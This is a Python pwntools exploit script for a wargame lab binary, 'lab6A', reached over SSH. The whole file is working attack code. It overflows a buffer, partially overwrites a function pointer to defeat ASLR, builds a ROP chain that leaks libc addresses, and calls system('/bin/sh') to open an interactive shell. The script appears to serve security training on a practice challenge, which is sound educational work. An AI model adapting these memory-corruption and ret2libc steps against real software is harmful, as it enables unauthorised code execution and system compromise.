#!/usr/bin/env python2

from pwn import *

# == How to use ==
# python ssh.py LOCAL
# python ssh.py REMOTE IP=127.0.0.1 USER=challenge PASS=challenge
# python ssh.py REMOTE IP=127.0.0.1 PORT=22 USER=challenge PASS=challenge

settings = {

    # Path to binary
    "binary"        : "./lab6A",

    # Path to custom libc
    "libc"          : None,

    # Remote path to binary
    "remote_binary" : ["/levels/lab06/lab6A"]
}

# Exploit here
def exploit():
    global p
    while True:
        try:
            p.close()
            # p = process(binary.path)
            p = shell.process(settings['remote_binary'])
            p.sendline("r")

            # Overflow print_listing_func
            p.sendlineafter("Enter Choice: ", "1")
            p.sendafter("Enter your name: ", "A" * 0x20)

            description = "A" * 0x5a
            description += p16(0x6be2) # Partial overwrite for print_name()
            p.sendafter("Enter your description: ", description)

            # Trigger print_name()
            p.sendlineafter("Enter Choice: ", "3")
            if "registers" in p.recvuntil("$", timeout=1):
                raise Exception

            # Get print_name
            p.recvuntil("is a " + "A" * 0x5a)
            print_name = u32(p.recv(4))
            log.info("Exe leak : {}".format(hex(print_name)))

            # Calculate make_note()
            base = print_name - 0xbe2
            make_note = print_name - 0x233

            # Overflow print_listing_func
            p.sendlineafter("Enter Choice: ", "1")
            p.sendafter("Enter your name: ", "A" * 0x20)

            description = "A" * 2
            description += p32(make_note) # Partial overwrite for print_name()
            p.sendafter("Enter your description: ", description)

            # Adds /bin/sh to BSS
            p.sendlineafter("Enter Choice: ", "2")
            p.sendlineafter("Enter your item's name: ", "/bin/sh")
            p.sendlineafter("Enter your item's price: ", p32(base + 0x300c))

            # Trigger make_note()
            p.sendlineafter("Enter Choice: ", "4")

            # Create ROP chain
            payload =  []
            payload += [0x1] * 13
            payload += [base + 0x97a] # write_wrap()
            payload += [base + 0x9af] # make_note()
            payload += [base + 0x3160] # pointer to addr of read@plt
            p.sendline(flat(payload))

            # Leak read() and printf()
            p.recvuntil("listing...: ")
            read = u32(p.recv(4))
            printf = u32(p.recv(4))
            log.info("Read() : {}".format(hex(read)))
            log.info("Printf() : {}".format(hex(printf)))

            # Calculate system()
            # libc_base = read - 0xd5af0 # LOCAL
            libc_base = read - 0xdabd0 # REMOTE
            # system = libc_base + 0x3ada0
            system = libc_base + 0x40190

            # Call system
            payload = []
            payload += [0x1] * 13
            payload += [system]
            payload += [base + 0x3140] # /bin/sh
            payload += [base + 0x3140] # /bin/sh
            payload += [base + 0x3140] # /bin/sh
            payload += [base + 0x3140] # /bin/sh
            p.sendline(flat(payload))

            p.interactive()
        except Exception as e:
            pass


# Initial setup
if __name__  == "__main__":

    binary = ELF(settings['binary'])
    p = None

    if settings['libc']:
        binary.libc = ELF(settings['libc'])


    if args['LOCAL']:
        p = process(binary.path)

    if args['REMOTE']:
        if not all([args.IP, args.USER, args.PASS]):
            log.warning("Missing IP/USER/PASS arguments.")
            exit()


        shell = ssh(args.USER, args.IP, port = int(args.PORT) or 22,
                                    password = args.PASS)

        p = shell.process(settings['remote_binary'])

    if not p:
        log.warning("Missing LOCAL/REMOTE argument.")
        exit()

    pause()
    exploit()
